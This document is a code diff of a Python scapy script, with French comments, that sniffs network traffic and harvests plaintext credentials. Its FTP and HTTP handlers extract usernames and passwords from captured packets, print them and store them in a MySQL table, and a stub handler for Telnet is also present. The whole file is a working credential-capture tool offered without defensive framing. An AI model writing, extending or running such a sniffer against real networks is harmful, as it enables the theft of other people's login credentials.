@@ -2,6 +2,7 @@
 from scapy.all import *
 import mysql.connector
 import datetime
+import re
 
 
 
@@ -14,102 +15,123 @@ db = mysql.connector.connect(
 )
 cursor = db.cursor()
 
-def ftp_packet_callback(pkt):
+def packet_callback(pkt):
     if pkt.haslayer(TCP) and pkt.haslayer(IP):
         src_ip = pkt[IP].src
         dst_ip = pkt[IP].dst
-        if pkt.haslayer(Raw):
-            payload = pkt[Raw].load.decode("utf-8", errors="ignore")
-            if "USER" in payload:
-                lines = payload.split("\r\n")
-                for line in lines:
-                    if line.startswith("USER"):
-                        global ftp_username
-                        ftp_username = line.split(" ")[1]
-                        print("Nouvelle connexion FTP détectée : {} -> {}".format(src_ip, dst_ip))
-                        print("Username : {}".format(ftp_username))
-            if "PASS" in payload:
-                lines = payload.split("\r\n")
-                for line in lines:
-                    if line.startswith("PASS"):
-                        global ftp_password
-                        ftp_password = line.split(" ")[1]
-                        print("Mot de passe : {}".format(ftp_password))
-            if "QUIT" in payload:
-                print("Connexion terminée : {} -> {}".format(src_ip, dst_ip))
-                # Delete the user from the database
-                #delete_user('ftp', src_ip, dst_ip)
-            if "Login successful" in payload:
-                print("Login successful for",ftp_username)
+        dst_port = pkt[TCP].dport
+
+        if dst_port == 21:
+            handle_ftp_packet(pkt, src_ip, dst_ip)
+        elif dst_port == 23:
+            handle_telnet_packet(pkt, src_ip, dst_ip)
+        elif dst_port == 80:
+            handle_http_packet(pkt, src_ip, dst_ip)
+
+def handle_ftp_packet(pkt, src_ip, dst_ip):
+    if pkt.haslayer(Raw):
+        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
+        if "USER" in payload:
+            lines = payload.split("\r\n")
+            for line in lines:
+                if line.startswith("USER"):
+                    global ftp_username
+                    ftp_username = line.split(" ")[1]
+                    print("FTP CONNEXION : {} -> {}".format(src_ip, dst_ip))
+                    print("Username : {}".format(ftp_username))
+        if "PASS" in payload:
+            lines = payload.split("\r\n")
+            for line in lines:
+                if line.startswith("PASS"):
+                    global ftp_password
+                    ftp_password = line.split(" ")[1]
+                    print("Mot de passe : {}".format(ftp_password))
+        if "QUIT" in payload:
+            print("Connexion terminée : {} -> {}".format(src_ip, dst_ip))
+            # Supprimer l'utilisateur de la base de données
+            # delete_user('ftp', src_ip, dst_ip)
+        if "SYST" in payload:
+            print("Login successful for", ftp_username)
+            current_time = datetime.datetime.now()
+            formatted_heur = str(current_time.strftime('%H:%M:%S'))
+            current_date = datetime.date.today()
+            user = {
+                'type': 'FTP',
+                'source_ip': dst_ip,
+                'destination_ip': src_ip,
+                'username': ftp_username,
+                'password': ftp_password,
+                'day': current_date,
+                'heur': formatted_heur
+            }
+            insert_user(user)
+
+def handle_telnet_packet(pkt, src_ip, dst_ip):
+    if pkt.haslayer(Raw):
+        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
+        print("PAYLOAD",payload)
+        if ":" in payload:
+            print("debut du nom d'utilisateur")
+        if "\r\n" in payload:
+            print("FIN")
+
+import re
+import datetime
+
+def handle_http_packet(pkt, src_ip, dst_ip):
+    if pkt.haslayer(Raw):
+        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
+        uname_keywords = ["uname", "user", "username", "User", "txtUsername", "mail"]
+
+        
+        for uname_keyword in uname_keywords:
+            if uname_keyword in payload and "&" in payload:
+                # Extraction de l'hôte
+                try:
+                    host_match = re.search(r"Host: (.+)", payload)
+                    host = host_match.group(1)
+                    destination_ip = dst_ip + ":" + host
+
+                except:
+                    destination_ip = dst_ip
+
+                # Extraction de uname
+                uname_match = re.search(fr"{uname_keyword}=(\w+)&", payload)
+                if uname_match:
+                    uname = uname_match.group(1)
+                else:
+                    uname = None
+                
+                # Extraction de pass
+                pass_match = re.search(r"&(.+)", payload)
+                if pass_match:
+                    password = pass_match.group(1)
+                else:
+                    password = None
+
                 current_time = datetime.datetime.now()
                 formatted_heur = str(current_time.strftime('%H:%M:%S'))
                 current_date = datetime.date.today()
-                user = {
-                    'type': 'ftp',
-                    'source_ip': dst_ip,
-                    'destination_ip': src_ip,
-                    'username': ftp_username,
-                    'password': ftp_password,
-                    'day': current_date,
-                    'heur': formatted_heur
-                }
-                insert_user(user)
 
-def telnet_packet_callback(pkt):
-    if pkt.haslayer(TCP) and pkt.haslayer(IP):
-        src_ip = pkt[IP].src
-        dst_ip = pkt[IP].dst
-        if pkt.haslayer(Raw):
-            payload = pkt[Raw].load.decode("utf-8", errors="ignore")
-            if "Username:" in payload:
-                lines = payload.split("\r\n")
-                for line in lines:
-                    if line.startswith("Username:"):
-                        telnet_username = line.split(" ")[1]
-                        print("Nouvelle connexion TELNET détectée : {} -> {}".format(src_ip, dst_ip))
-                        print("Utilisateur : {}".format(telnet_username))
-                        user = {
-                            'type': 'telnet',
-                            'source_ip': src_ip,
-                            'destination_ip': dst_ip,
-                            'username': telnet_username,
-                            'password': None
-                        }
-                        insert_user(user)
-            if "Password:" in payload:
-                lines = payload.split("\r\n")
-                for line in lines:
-                    if line.startswith("Password:"):
-                        telnet_password = line.split(" ")[1]
-                        print("Mot de passe : {}".format(telnet_password))
+                if uname is not None and password:
+                    user = {
+                        'type': 'HTTP',
+                        'source_ip': src_ip,
+                        'destination_ip': destination_ip,
+                        'username': uname,
+                        'password': password,
+                        'day': current_date,
+                        'heur': formatted_heur
+                    }
+                    insert_user(user)
+                    print("HTTP CONNEXION : {} -> {}".format(src_ip, dst_ip))
+                    print("Host :", host)
+                    print("Username :", uname)
+                    print("Mot de passe :",password)
 
-def smtp_packet_callback(pkt):
-    if pkt.haslayer(TCP) and pkt.haslayer(IP):
-        src_ip = pkt[IP].src
-        dst_ip = pkt[IP].dst
-        if pkt.haslayer(Raw):
-            payload = pkt[Raw].load.decode("utf-8", errors="ignore")
-            if "User:" in payload:
-                lines = payload.split("\r\n")
-                for line in lines:
-                    if line.startswith("User:"):
-                        smtp_username = line.split(":")[1].strip()
-                        print("Nouvelle connexion SMTP détectée : {} -> {}".format(src_ip, dst_ip))
-                        print("Utilisateur : {}".format(smtp_username))
-                        user = {
-                            'type': 'smtp',
-                            'source_ip': src_ip,
-                            'destination_ip': dst_ip,
-                            'username': smtp_username,
-                            'password': None
-                        }
-                        insert_user(user)
-            if "Pass:" in payload:
-                lines = payload.split("\r\n")
-                for line in lines:
-                    if line.startswith("Pass:"):
-                        smtp_password = line.split(":")[1].strip()
-                        print("Mot de passe : {}".format(smtp_password))
+                
+
+
 
 def insert_user(user):
     sql = "INSERT INTO users (type, source_ip, destination_ip, username, password, day, heur) VALUES (%s, %s, %s, %s, %s, %s, %s)"
@@ -118,9 +140,10 @@ def insert_user(user):
     db.commit()
 
 def start_packet_sniffing():
-    sniff(filter="tcp", prn=ftp_packet_callback, store=0)
-    sniff(filter="tcp", prn=telnet_packet_callback, store=0)
-    sniff(filter="tcp", prn=smtp_packet_callback, store=0)
+    sniff(filter="tcp", prn=packet_callback, store=0)
+    #sniff(filter="tcp", prn=ftp_packet_callback, store=0)
+    #sniff(filter="tcp", prn=telnet_packet_callback, store=0)
+    #sniff(filter="tcp", prn=smtp_packet_callback, store=0)
 
 if __name__ == '__main__':
     start_packet_sniffing()
